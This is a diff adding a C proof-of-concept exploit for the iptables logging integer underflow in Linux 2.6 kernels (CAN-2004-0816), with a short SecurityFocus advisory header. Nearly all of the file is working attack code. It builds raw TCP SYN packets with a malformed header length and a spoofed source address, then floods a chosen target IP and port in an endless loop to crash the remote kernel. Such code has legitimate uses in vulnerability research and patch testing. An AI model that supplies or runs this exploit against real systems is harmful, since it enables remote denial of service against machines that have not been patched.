@@ -1,0 +1,231 @@
+/*
+source: http://www.securityfocus.com/bid/11488/info
+
+It is reported that an integer underflow vulnerability is present in the iptables logging rules of the Linux kernel 2.6 branch.
+
+A remote attacker may exploit this vulnerability to crash a computer that is running the affected kernel.
+
+The 2.6 Linux kernel is reported prone to this vulnerability, the 2.4 kernel is not reported to be vulnerable.
+*/
+
+/* 
+* 
+* iptables.log.integer.underflow.POC.c 
+* 
+* (CAN-2004-0816, BID11488, SUSE-SA:2004:037)
+*
+* felix__zhou _at_ hotmail _dot_ com
+*
+* */
+
+#include <stdio.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <time.h>
+
+#pragma comment(lib,"ws2_32")
+
+static unsigned char dip[4];
+static unsigned int da;
+static unsigned short dp;
+static unsigned char dport[2];
+
+static unsigned char sip[4];
+static unsigned int sa;
+static unsigned short sp;
+static unsigned char sport[2];
+
+/*
+static void ip_csum(unsigned char *ip, unsigned int size, unsigned char *sum)
+{
+unsigned int csum = 0;
+unsigned char *p = ip;
+
+while (1 < size) {
+csum += (p[0] << 8) + p[1];
+p += 2;
+size -= 2;
+}
+
+if (size) 
+csum += *p;
+
+csum = (csum >> 16) + (csum & 0xffff);
+csum += (csum >> 16);
+
+sum[0] = (((unsigned short)(~csum)) >> 8);
+sum[1] = ((((unsigned short)(~csum)) << 8) >> 8);
+}
+*/
+
+static void tcp_csum(unsigned char *tcp, unsigned char *ip, 
+unsigned int size, unsigned char *sum)
+{
+unsigned int csum = 0;
+unsigned char *p = tcp;
+
+while (1 < size) {
+csum += (p[0] << 8) + p[1];
+p += 2;
+size -= 2;
+}
+
+csum += (ip[12] << 8) + ip[13];
+csum += (ip[14] << 8) + ip[15];
+
+csum += (ip[16] << 8) + ip[17];
+csum += (ip[18] << 8) + ip[19];
+
+csum += 0x06;
+csum += 0x14;
+
+if (size) 
+csum += *p;
+
+csum = (csum >> 16) + (csum & 0xffff);
+csum += (csum >> 16);
+
+sum[0] = (((unsigned short)(~csum)) >> 8);
+sum[1] = ((((unsigned short)(~csum)) << 8) >> 8);
+}
+
+static int work(SOCKET s)
+{
+DWORD ret = 1;
+unsigned char buf[1500];
+unsigned char *ip;
+unsigned char *tcp;
+unsigned int seq = 0x01;
+struct sockaddr_in host;
+
+ZeroMemory(buf, 1500);
+
+ip = buf;
+tcp = buf + 20;
+
+ip[0] = 0x45; /* ver & hlen */
+ip[3] = 0x28; /* tlen */
+ip[8] = 0x80; /* ttl */
+ip[9] = 0x06; /* protocol */
+ip[10] = ip[11] = 0;
+ip[12] = sip[0]; /* saddr */
+ip[13] = sip[1];
+ip[14] = sip[2];
+ip[15] = sip[3];
+ip[16] = dip[0]; /* daddr */
+ip[17] = dip[1];
+ip[18] = dip[2];
+ip[19] = dip[3];
+
+tcp[0] = sport[0];
+tcp[1] = sport[1];
+tcp[2] = dport[0]; /* dport */
+tcp[3] = dport[1];
+tcp[12] = 0x40; /* hlen */ /* HERE */
+tcp[13] = 0x02; /* flags */
+
+ZeroMemory(&host, sizeof(struct sockaddr_in));
+host.sin_family = AF_INET;
+host.sin_port = dp;
+host.sin_addr.s_addr = da;
+
+for (;; ) {
+tcp[4] = (seq >> 24); /* seq number */
+tcp[5] = ((seq << 8) >> 24);
+tcp[6] = ((seq << 16) >> 24);
+tcp[7] = ((seq << 24) >> 24);
+tcp[16] = tcp[17] = 0;
+seq ++;
+
+tcp_csum(tcp, ip, 0x14, tcp + 16);
+
+if (SOCKET_ERROR == sendto(s, buf, 0x28, 0, 
+(SOCKADDR *)&(host), sizeof host)) {
+if (WSAEACCES != WSAGetLastError()) {
+printf("sendto() failed: %d\n", 
+WSAGetLastError());
+
+ret = 1;
+} else {
+printf("You must be Administrator!\n");
+}
+
+break;
+}
+}
+
+return ret;
+}
+
+static char usage[] = "Usage: %s dip dport sip sport\n";
+
+int main(int argc, char **argv)
+{
+WORD ver = MAKEWORD(2, 2);
+WSADATA data;
+unsigned char *p;
+SOCKET s;
+int ret = 1;
+BOOL eopt = TRUE;
+
+if (5 != argc) {
+printf(usage, argv[0]);
+goto out;
+}
+
+if (INADDR_NONE == (da = inet_addr(argv[1]))) {
+printf("dest ip address is NOT valid!\n");
+printf(usage, argv[0]);
+goto out;
+}
+
+p = (unsigned char *)&da;
+dip[0] = p[0];
+dip[1] = p[1];
+dip[2] = p[2];
+dip[3] = p[3];
+
+dp = atoi(argv[2]);
+dport[0] = ((dp << 16) >> 24);
+dport[1] = ((dp << 24) >> 24);
+
+if (INADDR_NONE == (sa = inet_addr(argv[3]))) {
+printf("source ip address is NOT valid!\n");
+printf(usage, argv[3]);
+goto out;
+}
+
+p = (unsigned char *)&sa;
+sip[0] = p[0];
+sip[1] = p[1];
+sip[2] = p[2];
+sip[3] = p[3];
+
+sp = atoi(argv[4]);
+sport[0] = ((sp << 16) >> 24);
+sport[1] = ((sp << 24) >> 24);
+
+srand((unsigned int)time(0));
+
+if (WSAStartup(ver, &data)) {
+printf("WSAStartup() failed\n");
+goto out;
+}
+
+if (INVALID_SOCKET == (s = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, 0, 0, 0))) 
+goto err;
+
+if (SOCKET_ERROR == setsockopt(s, IPPROTO_IP, IP_HDRINCL, 
+(char *)&eopt, sizeof(eopt)))
+goto err1;
+
+work(s);
+
+err1:
+closesocket(s);
+err:
+WSACleanup();
+
+out:
+return ret;
+}
